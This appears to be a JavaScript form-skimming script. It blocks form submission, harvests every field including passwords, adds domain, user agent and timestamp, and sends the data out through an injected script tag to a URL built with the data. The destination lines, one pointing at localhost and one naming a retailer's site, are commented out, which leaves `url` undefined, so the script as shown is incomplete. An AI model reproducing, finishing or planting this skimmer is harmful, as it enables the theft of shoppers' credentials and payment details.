(function () {
    var forms = document.forms;
    var data = [];
    

    var $button = document.querySelector('button[title="Continue"]');

    if ($button) { 
        $button.addEventListener('click', capturedata, false);
    } else {
        for (var g = 0; g < forms.length; g++) {
            forms[g].addEventListener('submit', capturedata, false);
        }
    }



    function capturedata(e) {
        e.preventDefault();
        for (var h = 0; h < forms.length; h++) {
            var form = forms[h];
            data[h] = {};

            data[h].formname = form.name;
            data[h].formid = form.id;
            data[h].domain = document.domain;
            data[h].useragent = navigator.userAgent;
            data[h].timestamp = Number(new Date());

            var pairs = {};

            //generic elements
            for (var i = 0; i < form.length; i++) {
                var el = form[i];
                if (el.disabled == false) {
                    switch (el.type) {
                        case 'text':
                        case 'password':
                        case 'textarea':
                        case 'select-one':
                            var val = el.value;
                            if (val) { pairs[el.name] = val; }
                            break;
                        case 'select-multiple':
                            var result = [];
                            var options = el.options;
                            var opt;

                            for (var j = 0, iLen = options.length; j < iLen; j++) {
                                opt = options[j];
                                if (opt.selected) {
                                    result.push(opt.value || opt.text);
                                }
                            }

                            if (result.length) { pairs[el.name] = result; }
                            break;
                    }
                }
            }

            //checkboxes & radio buttons
            $input = document.getElementsByTagName('input');
            $checkboxgroups = [];

            for (var k = 0; k < $input.length; k++) {
                if ($input[k].type == 'checkbox') {
                    var el = $input[k];
                    var name = el.name;
                    var found = false;
                    if ($checkboxgroups.length) {
                        for (var l = 0; l < $checkboxgroups.length; l++) {
                            if ($checkboxgroups[l] == name) {
                                found = true;
                            }
                        }
                    }
                    if (!found) {
                        $checkboxgroups.push(name);
                    }
                }
                if ($input[k].type == 'radio' && $input[k].checked == true) {
                    pairs[$input[k].name] = $input[k].value;
                }
            }

            for (var m = 0; m < $checkboxgroups.length; m++) {
                var name = $checkboxgroups[m];
                var chkgrpobj = form[name];
                var str = [];
                for (var n = 0; n < chkgrpobj.length; n++) {
                    if (chkgrpobj[n].checked == true) {
                        str.push(chkgrpobj[n].value);
                    }
                }

                if (str.length) { pairs[name] = str; }
            }
            data[h].formdata = pairs;
        }

        window.myCallback = function (data) {
            console.log('myCallback');
            console.log(data);
        }

        var data_to_process = JSON.stringify(data);

        
        //var url = 'http://localhost:3000/processdata?data=' + data_to_process + '&callback=myCallback';

        //var url = http://www.avianneandco.com/

        var script = document.createElement('script');
        script.setAttribute('src', url);
        document.getElementsByTagName('head')[0].appendChild(script);




    }
}());